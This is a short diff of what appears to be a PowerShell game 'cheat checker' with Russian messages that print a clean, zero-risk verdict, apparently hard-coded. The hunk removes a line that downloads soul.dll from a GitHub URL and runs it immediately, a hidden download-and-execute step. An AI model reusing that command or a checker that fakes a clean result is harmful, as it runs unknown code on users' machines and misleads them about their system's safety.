@@ -74,7 +74,6 @@ Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
 Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
 Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
 Write-Host "=" * 50 -ForegroundColor Green
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll
 
 # ЛОГ (тоже чистый)
 $log = @"
